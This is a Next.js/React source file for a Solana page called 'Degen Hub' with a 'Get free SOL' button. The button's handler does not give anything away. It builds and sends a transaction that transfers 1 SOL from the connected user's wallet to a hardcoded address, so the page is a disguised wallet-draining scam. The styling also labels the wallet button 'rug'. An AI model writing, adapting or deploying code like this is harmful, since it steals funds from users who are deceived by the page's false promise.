import Link from "next/link";
import { WalletDisconnectButton, WalletModal, WalletMultiButton } from "@solana/wallet-adapter-react-ui";

import { SolanaLogo } from "components";
import styles from "./index.module.css";
import { WalletNotConnectedError } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Keypair, SystemProgram, Transaction } from '@solana/web3.js';
import React, { FC, useCallback } from 'react';




export const WalletView: FC = () => {
    const { connection } = useConnection();
    const { publicKey, sendTransaction } = useWallet();
    const  string   = "3SgV1dMLaFtRDF2cvxqdZFtdk8h6asE8cMmwgY58XJyb";

    const onClick = useCallback(async () => {
        if (!publicKey) throw new WalletNotConnectedError();

        

        const transaction = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: publicKey,
                toPubkey:  string,
                lamports: 1000000000,
            })
        );

        const signature = await sendTransaction(transaction, connection);

        await connection.confirmTransaction(signature, 'processed');
    }, [publicKey, sendTransaction, connection]);

    return (
<div  style={{backgroundImage: "url(" + "" + ")", fontFamily: "Skrapbook",justifyContent: "center",
    display: "flex",
      textAlign: 'center',
      flexDirection: "column",}}>
    <div className="container mx-auto max-w-6xl p-8 2xl:px-0">
      <div className={styles.container}>
        <div className="navbar mb-2 shadow-lg bg-neutral text-neutral-content rounded-box" style={{backgroundColor: "rgba(25,25,25,0.6)"}}>
          <div className="flex-none">
            <button className="btn btn-square btn-ghost">
              <span className="text-4xl">🐻</span>
            </button>
          </div>
          <div className="flex-1 px-2 mx-2">
            <a className="text-lg font-bold" href="./">Degen Hub</a>
          </div>
          <div className="flex-none">
          <WalletMultiButton className="rug" style={{color:"black", backgroundColor: "white", fontFamily: "Skrapbook"}}/>
          </div>
        </div>

    <div style={{color:"black",            justifyContent: "center",
      display: "flex",
        textAlign: 'center',
        height: "86.379999vh",
      flexDirection: "column",
          padding: "200px"}}>
          
             <h1 className="wiggle">
          <button onClick={onClick} className="btn btn-primary btn-lg" disabled={!publicKey}>
            Get free SOL
        </button>
        </h1>
        <a style={{color:"white",textDecoration: "underline" }} href="https://solscan.io/account/ABuywtbjWp8MbkP5mzCMdVq8LvvDKpTtwdJyr6dw61NJ">Check Address on Solscan</a>
              </div>
            </div>
          </div>

</div>
    );
    };